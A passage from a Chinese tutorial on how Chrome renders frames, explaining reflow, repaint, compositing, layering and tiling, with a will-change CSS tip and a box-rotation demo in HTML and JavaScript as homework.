来计算布局树，这样生成一幅图片时，会让整个渲染流水线的每个阶段都执行一遍，如果布局复杂的话，就很难保证渲染的效率了。而重绘因为没有了重新布局的阶段，操作效率稍微高点，但是依然需要重新计算绘制信息，并触发绘制操作之后的一系列操作。</p>\n<p>相较于重排和重绘，<strong>合成</strong>操作的路径就显得非常短了，并不需要触发布局和绘制两个阶段，如果采用了 GPU，那么合成的效率会非常高。</p>\n<p>所以，关于渲染引擎生成一帧图像的几种方式，按照效率我们推荐合成方式优先，若实在不能满足需求，那么就再退后一步使用重绘或者重排的方式。</p>\n<p>本文我们的焦点在合成上，所以接下来我们就来深入分析下 Chrome 浏览器是怎么实现合成操作的。Chrome 中的合成技术，可以用三个词来概括总结：<strong>分层、分块</strong>和<strong>合成</strong>。</p>\n<h2 id=\"分层和合成\"><a href=\"#分层和合成\" class=\"headerlink\" title=\"分层和合成\"></a>分层和合成</h2><p>通常页面的组成是非常复杂的，有的页面里要实现一些复杂的动画效果，比如点击菜单时弹出菜单的动画特效，滚动鼠标滚轮时页面滚动的动画效果，当然还有一些炫酷的 3D 动画特效。如果没有采用分层机制，从布局树直接生成目标图片的话，那么每次页面有很小的变化时，都会触发重排或者重绘机制，这种 “牵一发而动全身” 的绘制策略会严重影响页面的渲染效率。</p>\n<p><strong>为了提升每帧的渲染效率，Chrome 引入了分层和合成的机制。那该怎么来理解分层和合成机制呢？</strong></p>\n<p>你可以把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。如果你熟悉 PhotoShop 的话，就能很好地理解这个过程了，PhotoShop 中一个项目是由很多图层构成的，每个图层都可以是一张单独图片，可以设置透明度、边框阴影，可以旋转或者设置图层的上下位置，将这些图层叠加在一起后，就能呈现出最终的图片了。</p>\n<p>在这个过程中，将素材分解为多个图层的操作就称为<strong>分层</strong>，最后将这些图层合并到一起的操作就称为合成。所以，分层和合成通常是一起使用的。</p>\n<p>考虑到一个页面被划分为两个层，当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。</p>\n<p><strong>理解了为什么要引入合成和分层机制，下面我们再来看看 Chrome 是怎么实现分层和合成机制的。</strong></p>\n<p>在 Chrome 的渲染流水线中，<strong>分层体现在生成布局树之后</strong>，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。</p>\n<p>层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。在《<a href=\"/browser/protocol/http-navigation.html\">渲染流程</a>》中我们介绍过，绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成 <code>|Paint BackGroundColor:Black | Paint Circle|</code> 这样的绘制指令列表，绘制过程就完成了。</p>\n<p>有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为 “一张” 图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。</p>\n<p><strong>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的</strong>。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p>\n<h2 id=\"分块\"><a href=\"#分块\" class=\"headerlink\" title=\"分块\"></a>分块</h2><p>如果说分层是从宏观上提升了渲染效率，那么分块则是从微观层面提升了渲染效率。</p>\n<p>通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。</p>\n<p>因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素 —— 纹理上传，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。</p>\n<p>为了解决这个问题，Chrome 又采取了一个策略：<strong>在首次合成图块的时候使用一个低分辨率的图片</strong>。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好。</p>\n<h2 id=\"如何利用分层技术优化代码\"><a href=\"#如何利用分层技术优化代码\" class=\"headerlink\" title=\"如何利用分层技术优化代码\"></a>如何利用分层技术优化代码</h2><p>通过上面的介绍，相信你已经理解了渲染引擎是怎么将布局树转换为漂亮图片的，理解其中原理之后，你就可以利用分层和合成技术来优化代码了。</p>\n<p>在写 Web 应用的时候，你可能经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。</p>\n<p>这时你可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> {</span><br><span class=\"line\"><span class=\"attribute\">will-change</span>: transform, opacity;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一帧，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。这也是 <strong>CSS 动画比 JavaScript 动画高效的原因</strong>。</p>\n<p>所以，如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存，所以你需要恰当地使用 will-change。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p>\n<ul>\n<li>首先我们介绍了显示器显示图像的原理，以及帧和帧率的概念，然后基于帧和帧率我们又介绍渲染引擎是如何实现一帧图像的。通常渲染引擎生成一帧图像有三种方式：重排、重绘和合成。其中重排和重绘操作都是在渲染进程的主线程上执行的，比较耗时；而合成操作是在渲染进程的合成线程上执行的，执行速度快，且不占用主线程。</li>\n<li>然后我们重点介绍了浏览器是怎么实现合成的，其技术细节主要可以使用三个词来概括：分层、分块和合成。</li>\n<li>最后我们还讲解了 CSS 动画比 JavaScript 动画高效的原因，以及怎么使用 will-change 来优化动画或特效。</li>\n</ul>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>观察下面代码，结合 Performance 面板、内存面板和分层面板，全面比较在 box 中使用 will-change 和不使用 will-change 的效率、性能和内存占用等情况。</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>观察will-change<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-class\">.box</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">will-change</span>: transform, opacity;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">display</span>: block;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">float</span>: left;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">width</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">15px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">rgb</span>(<span class=\"number\">136</span>, <span class=\"number\">136</span>, <span class=\"number\">136</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">background</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">187</span>, <span class=\"number\">177</span>, <span class=\"number\">37</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">border-radius</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">transition</span>: border-radius <span class=\"number\">1s</span> ease-out;</span></span><br><span class=\"line\"><span class=\"language-css\">        }</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">body</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-family</span>: Arial;</span></span><br><span class=\"line\"><span class=\"language-css\">        }</span></span><br><span class=\"line\"><span class=\"language-css\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"controls\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"start\"</span>&gt;</span>start<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"stop\"</span>&gt;</span>stop<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span>&gt;</span>旋转盒子<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> boxes = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">'.box'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> boxes1 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">'.box1'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> start = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'start'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> stop = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'stop'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> stop_flag = <span class=\"literal\">false</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        start.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">'click'</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            stop_flag = <span class=\"literal\">false</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"title function_\">requestAnimationFrame</span>(render);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        })</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        stop.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">'click'</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            stop_flag = <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        })</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> rotate_ = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">let</span> opacity_ = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">function</span> <span class=\"title function_\">render</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">if</span> (stop_flag)</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            rotate_ = rotate_ + <span class=\"number\">6</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">if</span> (opacity_ &gt; <span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">                opacity_ = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            opacity_ = opacity_ + <span class=\"number\">0.01</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> command = <span class=\"string\">'rotate('</span> + rotate_ + <span class=\"string\">'deg)'</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> index = <span class=\"number\">0</span>; index &lt; boxes.<span class=\"property\">length</span>; index++) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">                boxes[index].<span class=\"property\">style</span>.<span class=\"property\">transform</span> = command</span></span><br><span class=\"line\"><span class=\"language-javascript\">                boxes[index].<span class=\"property\">style</span>.<span class=\"property\">opacity</span> = opacity_</span></span><br><span class=\"line\"><span class=\"language-javascript\">            }</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"title function_\">requestAnimationFrame</span>(render);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span 